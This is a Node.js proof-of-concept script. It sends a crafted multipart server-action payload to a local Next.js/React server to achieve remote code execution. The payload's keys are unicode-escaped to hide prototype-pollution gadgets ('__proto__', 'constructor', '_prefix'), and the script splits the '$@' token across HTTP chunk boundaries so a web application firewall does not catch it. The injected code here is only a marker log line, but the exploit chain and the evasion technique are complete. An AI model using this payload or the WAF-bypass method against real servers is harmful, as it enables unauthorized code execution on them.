/**
 * Chunked Transfer Encoding Test
 * Split $@ across chunk boundaries to test WAF bypass
 */
const net = require('net');

const boundary = '----WebKitFormBoundary7MA4YWxk';

// Build multipart body with proper CRLF
function buildBody() {
  const field0 = JSON.stringify({
    "\u0074\u0068\u0065\u006e": "$1:\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f:\u0074\u0068\u0065\u006e",
    "\u0073\u0074\u0061\u0074\u0075\u0073": "\u0072\u0065\u0073\u006f\u006c\u0076\u0065\u0064\u005f\u006d\u006f\u0064\u0065\u006c",
    "\u0072\u0065\u0061\u0073\u006f\u006e": -1,
    "\u0076\u0061\u006c\u0075\u0065": "{\"then\":\"$B1337\"}",
    "\u005f\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065": {
      "\u005f\u0070\u0072\u0065\u0066\u0069\u0078": "console.log('CHUNKED-RCE');//",
      "\u005f\u0063\u0068\u0075\u006e\u006b\u0073": "$Q2",
      "\u005f\u0066\u006f\u0072\u006d\u0044\u0061\u0074\u0061": {
        "\u0067\u0065\u0074": "$1:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"
      }
    }
  });

  const parts = [];
  parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="0"\r\n\r\n${field0}`);
  parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"`);
  parts.push(`--${boundary}\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]`);
  parts.push(`--${boundary}--`);

  return parts.join('\r\n') + '\r\n';
}

/**
 * Send chunked request splitting at $@ boundary
 */
function sendChunkedRequest(body) {
  return new Promise((resolve, reject) => {
    // Find $@ and split there
    const dollarIdx = body.indexOf('"$@');
    const splitPoint = dollarIdx + 2; // After "$

    const chunk1 = body.slice(0, splitPoint);
    const chunk2 = body.slice(splitPoint);

    console.log(`Splitting at position ${splitPoint}`);
    console.log(`Chunk 1 ends: ...${chunk1.slice(-15)}`);
    console.log(`Chunk 2 starts: ${chunk2.slice(0, 15)}...`);

    const socket = new net.Socket();

    socket.connect(3000, 'localhost', () => {
      // Send headers
      const headers = [
        'POST / HTTP/1.1',
        'Host: localhost:3000',
        `Content-Type: multipart/form-data; boundary=${boundary}`,
        'Transfer-Encoding: chunked',
        'Next-Action: test-chunked',
        '',
        ''
      ].join('\r\n');

      socket.write(headers);

      // Send chunk 1
      socket.write(`${chunk1.length.toString(16)}\r\n${chunk1}\r\n`);
      console.log(`Sent chunk 1: ${chunk1.length} bytes`);

      // Small delay then send chunk 2
      setTimeout(() => {
        socket.write(`${chunk2.length.toString(16)}\r\n${chunk2}\r\n`);
        console.log(`Sent chunk 2: ${chunk2.length} bytes`);

        // Terminate
        socket.write('0\r\n\r\n');
        console.log('Sent terminator');
      }, 100);
    });

    let response = '';
    socket.on('data', d => response += d.toString());
    socket.on('close', () => resolve(response));
    socket.on('error', reject);

    // Timeout
    setTimeout(() => {
      socket.destroy();
      resolve(response || 'TIMEOUT');
    }, 5000);
  });
}

async function main() {
  console.log('='.repeat(50));
  console.log('Chunked Transfer Encoding Test');
  console.log('='.repeat(50));

  const body = buildBody();
  console.log(`\nTotal payload: ${body.length} bytes`);
  console.log(`$@ at index: ${body.indexOf('$@')}`);

  console.log('\nSending chunked request (split at $@)...\n');

  const response = await sendChunkedRequest(body);

  const statusMatch = response.match(/HTTP\/\d\.\d (\d+)/);
  console.log(`\nHTTP Status: ${statusMatch ? statusMatch[1] : 'unknown'}`);

  const bodyStart = response.indexOf('\r\n\r\n');
  if (bodyStart !== -1) {
    console.log('Response body:', response.slice(bodyStart + 4, bodyStart + 200));
  }

  console.log('\n[Check server console for "CHUNKED-RCE" output]');
}

main().catch(console.error);
